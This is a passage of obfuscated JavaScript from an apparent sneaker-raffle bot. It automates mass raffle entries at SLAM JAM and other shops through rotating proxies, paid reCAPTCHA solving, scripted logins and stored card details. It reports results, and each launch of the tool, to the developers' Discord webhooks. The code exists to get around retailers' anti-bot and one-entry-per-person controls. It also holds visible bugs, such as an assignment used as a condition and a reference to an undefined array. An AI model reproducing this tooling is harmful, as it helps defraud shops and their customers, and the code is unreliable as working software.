                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x228be9));
                            }
                        } catch (_0x3771c1) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20' + _0x3771c1));
                        } finally {
                            _0x7a23a8 && _0x7a23a8['close']();
                            if (_0x2b5a7e == 'yes' && _0x3bf428 != 0x5) {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x3017e2['name'] + ']\x20Task\x20' + (_0x55654c + 0x1) + '\x20:\x20Retrying')), _0x55654c = _0x55654c - 0x1, _0x3bf428 = _0x3bf428 + 0x1;
                                continue;
                            }
                            _0x2b5a7e == 'yes' && _0x3bf428 >= 0x5 && (_0x2e4d36(_0x53d193[_0x55654c], _0x3017e2), _0x2b5a7e = 'no', _0x3bf428 = 0x0), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x51cac4, _0x2a55f2, _0x269c78) {
                    _0x198f78['use'](_0x538ad0()), _0x198f78['use'](_0x3393bf({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x37a01c['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x21c713 = 0x0; _0x21c713 < _0x2a55f2['length']; _0x21c713++) {
                        var _0x1e0dfe;
                        if (_0x1077f6 != 'yes')
                            var _0x1077f6 = '', _0x458628 = 0x0;
                        _0x219354(_0x51cac4['name'] + '\x20Task\x20' + (_0x21c713 + 0x1) + '\x20/\x20' + _0x2a55f2['length'] + '\x20||\x20File:\x20' + _0x4e44e9 + '\x20Proxies:\x20' + _0xd50a79), await _0x170817(_0x2a55f2, _0x21c713);
                        if (_0x2a55f2[_0x21c713]['Email'] == '' || _0x2a55f2[_0x21c713]['Password'] == '' || _0x2a55f2[_0x21c713]['FirstName'] == '' || _0x2a55f2[_0x21c713]['LastName'] == '') {
                            console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x37a01c['useRandomProxy'] = ![])
                            var _0x42a987 = _0x269c78[_0x21c713]['split'](':');
                        else
                            var _0x2f7ed2 = Math['round'](Math['random']() * (_0x269c78['length'] - 0x1)), _0x42a987 = _0x269c78[_0x2f7ed2]['split'](':');
                        const _0x44beb3 = await _0x198f78['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x42a987[0x0] + ':' + _0x42a987[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x5ed88f = await _0x44beb3['newPage']();
                            await _0x5ed88f['authenticate']({
                                'username': '' + _0x42a987[0x2],
                                'password': '' + _0x42a987[0x3]
                            }), await _0x5ed88f['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5ed88f['setRequestInterception'](!![]), _0x5ed88f['on']('request', _0x46e673 => {
                                _0x46e673['resourceType']() === 'image' || _0x46e673['resourceType']() === 'font' || _0x46e673['resourceType']() === 'media' ? _0x46e673['abort']() : _0x46e673['continue']();
                            }), await _0x5ed88f['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x5ed88f['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x5ed88f['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x1a79bd(0x258), await _0x5ed88f['waitForSelector']('#CustomerEmail'), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x5ed88f['type']('#CustomerEmail', '' + _0x2a55f2[_0x21c713]['Email']), await _0x1a79bd(0x12c), await _0x5ed88f['type']('#CustomerPassword', '' + _0x2a55f2[_0x21c713]['Password']), await _0x1a79bd(0x226), await _0x5ed88f['$eval']('#customer_login', _0xa73c79 => _0xa73c79['submit']()), await _0x1a79bd(0x7d0), await _0x5ed88f['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20' + _0x41d282['cyan']('Solving\x20Captcha')), await _0x5ed88f['solveRecaptchas'](), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x5ed88f['$eval']('.shopify-challenge__container\x20>\x20form', _0x3491cf => _0x3491cf['submit']());
                            try {
                                await _0x5ed88f['waitForSelector']('.nav-account'), await _0x1a79bd(0x4b0);
                            } catch {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x5ed88f['goto']('' + _0x2a55f2[_0x21c713]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x1a79bd(0xbb8), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x5ed88f['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x5ed88f['click']('.product-select-variant-wrapper'), await _0x1a79bd(0x320), await _0x5ed88f['click']('li.product-select-variant__value[data-size=\x22' + _0x2a55f2[_0x21c713]['Size'] + '\x22]'), await _0x1a79bd(0x384), await _0x5ed88f['$eval']('#AddToCartForm-product-template-raffle', _0x60fcdf => _0x60fcdf['submit']()), await _0x5ed88f['waitForSelector']('.cart-order-summary__content'), await _0x1a79bd(0x514), await _0x5ed88f['goto']('https://drop.slamjam.com/checkout'), await _0x1a79bd(0x514), await _0x5ed88f['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5ed88f['select']('#checkout_shipping_address_country', '' + _0x2a55f2[_0x21c713]['Country']), await _0x1a79bd(0x200), await _0x5ed88f['waitForSelector']('#checkout_shipping_address_first_name'), await _0x5ed88f['type']('#checkout_shipping_address_first_name', '' + _0x2a55f2[_0x21c713]['FirstName']), await _0x1a79bd(0x237), await _0x5ed88f['type']('#checkout_shipping_address_last_name', '' + _0x2a55f2[_0x21c713]['LastName']), await _0x1a79bd(0x1e0), await _0x5ed88f['type']('#checkout_shipping_address_address1', _0x2a55f2[_0x21c713]['Address1'] + '\x20' + _0x2a55f2[_0x21c713]['HouseNumber']), await _0x1a79bd(0x514), await _0x5ed88f['type']('#checkout_shipping_address_address2', '' + _0x2a55f2[_0x21c713]['Address2']), await _0x1a79bd(0x514);
                            _0x2a55f2[_0x21c713]['Postcode'] == undefined && (_0x2a55f2[_0x21c713]['Postcode'] = _0x2a55f2[_0x21c713]['Zip']);
                            await _0x5ed88f['type']('#checkout_shipping_address_zip', '' + _0x2a55f2[_0x21c713]['Postcode']), await _0x1a79bd(0x2bc), await _0x5ed88f['type']('#checkout_shipping_address_city', '' + _0x2a55f2[_0x21c713]['City']), await _0x1a79bd(0x320), await _0x5ed88f['type']('#checkout_shipping_address_phone', '' + _0x2a55f2[_0x21c713]['Phone']), await _0x1a79bd(0x320), await _0x5ed88f['click']('#continue_button'), await _0x1a79bd(0xbb8), await _0x5ed88f['waitForSelector']('.summary-title'), await _0x1a79bd(0x320), await _0x5ed88f['click']('#continue_button'), await _0x1a79bd(0x320), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x5ed88f['waitForSelector']('#checkout_credit_card_vault'), await _0x1a79bd(0x3e8);
                            var _0x5e9ac9 = await _0x5ed88f['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x795121 = await _0x5e9ac9['contentFrame']();
                            await _0x795121['click']('#number'), await _0x1a79bd(0x3e8), await _0x795121['type']('#number', '' + _0x2a55f2[_0x21c713]['CardNumber'], { 'delay': 0x78 }), _0x5e9ac9 = await _0x5ed88f['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x795121 = await _0x5e9ac9['contentFrame'](), await _0x1a79bd(0x1c2), await _0x795121['click']('#name'), await _0x1a79bd(0x1f4), await _0x795121['type']('#name', '' + _0x2a55f2[_0x21c713]['NameOnCard'], { 'delay': 0x78 }), _0x5e9ac9 = await _0x5ed88f['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x795121 = await _0x5e9ac9['contentFrame'](), await _0x1a79bd(0x1c2), await _0x795121['click']('#expiry'), await _0x1a79bd(0x1f4), await _0x795121['type']('#expiry', '' + _0x2a55f2[_0x21c713]['ExpiryDate'], { 'delay': 0x78 }), _0x5e9ac9 = await _0x5ed88f['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x795121 = await _0x5e9ac9['contentFrame'](), await _0x1a79bd(0x1c2), await _0x795121['click']('#verification_value'), await _0x1a79bd(0x1f4), await _0x795121['type']('#verification_value', '' + _0x2a55f2[_0x21c713]['CVV'], { 'delay': 0x78 }), await _0x5ed88f['$eval']('#accepts-flag-raffle', _0x37bfae => _0x37bfae['click']()), await _0x1a79bd(0x7d0), console['log'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x5ed88f['$eval']('#continue_button', _0x1c4947 => _0x1c4947['click']()), await _0x1a79bd(0x1b58), await _0x5ed88f['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x5ed88f['$eval']('.edit_checkout.animate-floating-labels', _0x1c5d04 => _0x1c5d04['submit']()), await _0x1a79bd(0x7d0);
                            try {
                                await _0x5ed88f['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x1077f6 = 'no', _0x4c6d06(_0x2a55f2[_0x21c713], _0x51cac4), console['log'](_0x41d282['green'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x425e6d) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x425e6d['message']);
                            }
                            var _0x410ea0 = await _0x550a27(_0x2a55f2[_0x21c713], _0x51cac4, 'dev', ![]), _0x1220dc = await _0x550a27(_0x2a55f2[_0x21c713], _0x51cac4, 'pub', ![]);
                            const _0x5dc82d = {
                                'succesDEVMSG': { 'embeds': [_0x410ea0] },
                                'succesPUBMSG': { 'embeds': [_0x1220dc] }
                            };
                            try {
                                _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], _0x5dc82d['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x152092, _0x5dc82d['succesDEVMSG']), await _0x1a79bd(0xc8), await _0x21228b(_0x136ee7, _0x5dc82d['succesPUBMSG']);
                            } catch (_0x46aad2) {
                                console['log'](_0x41d282['yellow'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x46aad2));
                            }
                        } catch (_0x3961d2) {
                            console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x1ee1d2[taskModule]['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20' + _0x3961d2)), _0x1e0dfe = '' + _0x3961d2;
                            var _0x5a866e = await _0x550a27(kickz[_0x21c713], _0x51cac4, 'dev', !![], _0x1e0dfe);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x5a866e] }, _0x37a01c['webhook'] != undefined && _0x37a01c['webhook'] != '' && await _0x21228b(_0x37a01c['webhook'], EMBEDS['errorDEV']), await _0x21228b(_0x549818, EMBEDS['errorDEV']), _0x1077f6 = 'yes';
                        } finally {
                            _0x44beb3 && _0x44beb3['close']();
                            if (_0x1077f6 == 'yes' && _0x458628 != 0x5 && _0x1e0dfe != 'Size\x20Not\x20Found') {
                                console['log'](_0x41d282['red'](_0x223c9e() + '\x20[' + _0x51cac4['name'] + ']\x20Task\x20' + (_0x21c713 + 0x1) + '\x20:\x20Retrying')), _0x21c713 = _0x21c713 - 0x1, _0x458628 = _0x458628 + 0x1;
                                continue;
                            }
                            _0x1077f6 == 'yes' && _0x458628 >= 0x5 && (_0x2e4d36(_0x2a55f2[_0x21c713], _0x51cac4), _0x1077f6 = 'no', _0x458628 = 0x0), console['log']('Waiting\x20for\x20' + _0x37a01c['delay'] + '\x20ms'), await _0x1a79bd(_0x37a01c['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x53096a) {
                    var _0x3bcfb7 = await _0x4f2028(), _0xdebe9d = _0x496729['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x29bd32 = _0x290c0b['parse'](_0xdebe9d, { 'header': !![] })['data'];
                    for (var _0x3ed9be = 0x0; _0x3ed9be < _0x29bd32['length']; _0x3ed9be++) {
                        var _0x44c671 = _0x29bd32[_0x3ed9be]['Store'], _0x1f75de = _0x29bd32[_0x3ed9be]['Mode'];
                        for (var _0x36cd93 of _0x1ee1d2) {
                            const _0x443894 = _0x36cd93['name']['includes'](_0x44c671);
                            if (!_0x443894)
                                continue;
                            for (mode of _0x36cd93['modules']) {
                                if (mode['name'] == _0x1f75de) {
                                    console['log']('Running\x20' + _0x41d282['cyan'](mode['name'])), await mode['function'](mode, [_0x29bd32[_0x3ed9be]], _0x3bcfb7);
                                    var _0x5de3c5 = _0xdebe9d['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x496729['writeFileSync']('../failed-tasks.csv', _0x5de3c5);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x399770 = await _0x5208ba['get']('Answer');
                    if (_0x399770['Answer']['toLowerCase']() == 'y') {
                        _0x496729['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x1a79bd(0x3e8);
                        return;
                    }
                    if (_0x399770['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x1a79bd(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x1a79bd(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x1229b6(_0x4ed81f) {
    var _0x287f0a = await _0x4f2028(), _0x1e5481 = _0x496729['readFileSync']('../failed-tasks.csv', 'utf-8'), _0xf0ccce = _0x290c0b['parse'](_0x1e5481, { 'header': !![] })['data'];
    for (var _0x3f6723 = 0x0; _0x3f6723 < _0xf0ccce['length']; _0x3f6723++) {
        var _0xed3121 = _0xf0ccce[_0x3f6723]['Store'], _0x1098b5 = _0xf0ccce[_0x3f6723]['Mode'];
        for (var _0x4ac2fb of _0x1ee1d2) {
            const _0x1a6d87 = _0x4ac2fb['name']['includes'](_0xed3121);
            if (_0x1a6d87)
                for (mode of _0x1ee1d2[_0x4ac2fb]['modules']) {
                    const _0x4af2c7 = mode['name']['includes'](_0x1098b5);
                    _0x4af2c7 && (_0x4ed81f = mode['name'], await mode['function'](_0x4ed81f, _0xf0ccce[_0x3f6723], _0x287f0a));
                }
        }
    }
}
async function _0x81e381() {
    await _0x1afc58(), console['clear']();
    if (_0x3dc3b3 != 'devkey') {
        let _0x52cba1 = await _0x3e6b8a['autoUpdate']();
        if (_0x52cba1 === 'yes')
            return _0x139422('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x50d201 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x1a79bd(0x2710);
        ;
    }
    await _0x54357f(_0x50d201);
    if (_0xf0afdf === ![])
        return console['log']('Closing\x20Browser'), await _0x1a79bd(0xbb8);
    else
        try {
            var _0x18278f = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3da10f
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3dc3b3
                    }
                ]
            }];
            const _0x3b8453 = { 'embeds': _0x18278f };
            var _0x37bb79 = await _0x550a27(null, null, 'open', ![]);
            const _0x1fd23e = { 'openDEVMSG': { 'embeds': [_0x37bb79] } };
            await _0x21228b(_0x1a9eb6, _0x1fd23e['openDEVMSG']);
            async function _0x444bb4() {
                _0x219354('JRaffles\x20' + _0x3dc3b3), console['clear'](), console['log']('Welcome\x20to\x20' + _0x41d282['cyan']('JRaffles();') + '\x20' + _0x3dc3b3), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1e8784 = 0x0; _0x1e8784 < _0x1ee1d2['length'] - 0x4; _0x1e8784++) {
                    if (_0x1e8784 >= 0xa) {
                        console['log']('\x20(' + _0x1e8784 + ')\x20[' + _0x1ee1d2[_0x1e8784]['name'] + ']');
                        continue;
                    }
                    if (_0x1ee1d2[_0x1e8784]['name'] === 'Reload\x20Settings' || _0x1ee1d2[_0x1e8784]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1e8784 + ')\x20\x20[' + _0x1ee1d2[_0x1e8784]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1ee1d2['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x1ee1d2['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x1ee1d2['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1ee1d2['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x4d99b0();
                if (taskModule > _0x1ee1d2['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x1a79bd(0x3e8), _0x444bb4();
                if (_0x1ee1d2[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                    var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x54627d = await _0x4f2028(), _0x3f2461 = await _0x5b31d5();
                        _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x3f2461), await _0x2bf776['function'](_0x2bf776, _0x3f2461, _0x54627d);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x54627d = await _0x4f2028(), _0x3f2461 = await _0x5b31d5();
                            _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x3f2461), await _0x2bf776['function'](_0x2bf776, _0x3f2461, _0x54627d);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x54627d = await _0x4f2028();
                                await _0x2bf776['function'](_0x2bf776, _0x54627d);
                            }
                        }
                    }
                    return _0x444bb4();
                }
                if (_0x1ee1d2[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                        var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x54627d = await _0x4f2028(), _0x54019e = await _0x5b31d5();
                            _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x54019e), await _0x2bf776['function'](_0x2bf776, _0x54019e, _0x54627d);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x54627d = await _0x4f2028(), _0x54019e = await _0x5b31d5();
                                _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x54019e), await _0x2bf776['function'](_0x2bf776, _0x54019e, _0x54627d);
                            }
                        }
                    } catch (_0x358c9d) {
                        console['log'](_0x358c9d), await _0x1a79bd(0xfa0);
                    }
                    return _0x444bb4();
                }
                if (_0x1ee1d2[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                    var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x54627d = await _0x4f2028();
                        return await _0x2bf776['function'](_0x2bf776, _0x54627d), _0x444bb4();
                    }
                    var _0x54627d = await _0x4f2028(), _0x1052a4 = await _0x5b31d5();
                    return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x1052a4), await _0x2bf776['function'](_0x2bf776, _0x1052a4, _0x54627d), _0x444bb4();
                }
                if (_0x1ee1d2[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                    var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x54627d = await _0x4f2028(), _0x1052a4 = await _0x5b31d5();
                    return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x1052a4), await _0x2bf776['function'](_0x2bf776, _0x1052a4, _0x54627d), _0x444bb4();
                } else {
                    if (_0x1ee1d2[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                        var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x54627d = await _0x4f2028(), _0x2008cd = await _0x5b31d5();
                            return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x2008cd), await _0x2bf776['function'](_0x2bf776, _0x2008cd, _0x54627d), _0x444bb4();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x54627d = await _0x4f2028();
                                return await _0x2bf776['function'](_0x2bf776, links, _0x54627d), _0x444bb4();
                            }
                        }
                        ;
                    } else {
                        if (_0x1ee1d2[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                            var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction], _0x54627d = await _0x4f2028(), _0x1203c7 = await _0x5b31d5();
                            return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x1203c7), await _0x2bf776['function'](_0x2bf776, _0x1203c7, _0x54627d), await _0x1a79bd(0x1388), _0x444bb4();
                        } else {
                            if (_0x1ee1d2[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x54627d = await _0x4f2028(), _0x2008cd = await _0x5b31d5();
                                    return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x2008cd), await _0x2bf776['function'](_0x2bf776, _0x2008cd, _0x54627d), _0x444bb4();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x54627d = await _0x4f2028();
                                        return await _0x2bf776['function'](_0x2bf776, links, _0x54627d), _0x444bb4();
                                    }
                                }
                                ;
                            } else {
                                if (_0x1ee1d2[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                    var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x167cbf('https://bouncewear.com/nl/account/register', _0x2bf776);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1ee1d2[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                        var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x54627d = await _0x4f2028(), _0xbd7a9f = await _0x5b31d5();
                                            return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0xbd7a9f), await _0x2bf776['function'](_0x2bf776, _0xbd7a9f, _0x54627d), _0x444bb4();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x54627d = await _0x4f2028(), _0xbd7a9f = await _0x5b31d5();
                                                return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0xbd7a9f), await _0x2bf776['function'](_0x2bf776, _0xbd7a9f, _0x54627d), _0x444bb4();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1ee1d2[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                            var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x54627d = await _0x4f2028(), _0x3a4031 = await _0x5b31d5();
                                                return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x3a4031), await _0x2bf776['function'](_0x2bf776, _0x3a4031, _0x54627d), _0x444bb4();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x54627d = await _0x4f2028(), _0x3a4031 = await _0x5b31d5();
                                                    return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x3a4031), await _0x2bf776['function'](_0x2bf776, _0x3a4031, _0x54627d), _0x444bb4();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1ee1d2[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                                var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x54627d = await _0x4f2028(), _0x19ff9b = await _0x5b31d5();
                                                    return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x19ff9b), await _0x2bf776['function'](_0x2bf776, _0x19ff9b, _0x54627d), _0x444bb4();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x54627d = await _0x4f2028(), _0x19ff9b = await _0x5b31d5();
                                                        return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x19ff9b), await _0x2bf776['function'](_0x2bf776, _0x19ff9b, _0x54627d), _0x444bb4();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1ee1d2[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                                    var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x54627d = await _0x4f2028(), _0x1c732b = await _0x5b31d5();
                                                        return _0x37a01c['shuffleTasks'] && await _0x3726ab(_0x1c732b), await _0x2bf776['function'](_0x2bf776, _0x1c732b, _0x54627d), _0x444bb4();
                                                    }
                                                } else {
                                                    if (_0x1ee1d2[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x1a79bd(0x3e8), _0x444bb4();
                                                    else {
                                                        if (_0x1ee1d2[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0xd02c1f = _0x1ee1d2[taskModule]['name'], _0x54627d = await _0x4f2028();
                                                            await _0x356d8a(_0xd02c1f, _0x54627d);
                                                        } else {
                                                            if (_0x1ee1d2[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x18a2fd(_0x1ee1d2[taskModule]['modules']);
                                                                var _0x2bf776 = _0x1ee1d2[taskModule]['modules'][taskFunction];
                                                                return await _0x2bf776['function'](_0x2bf776), _0x444bb4();
                                                            } else {
                                                                if (_0x1ee1d2[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x3195d5 = 0x0;
                                                                    for (const _0x15f5b4 in _0x37a01c) {
                                                                        console['log']('(' + _0x3195d5 + ')\x20' + _0x15f5b4 + '\x20:\x20' + _0x37a01c[_0x15f5b4]), _0x3195d5++;
                                                                    }
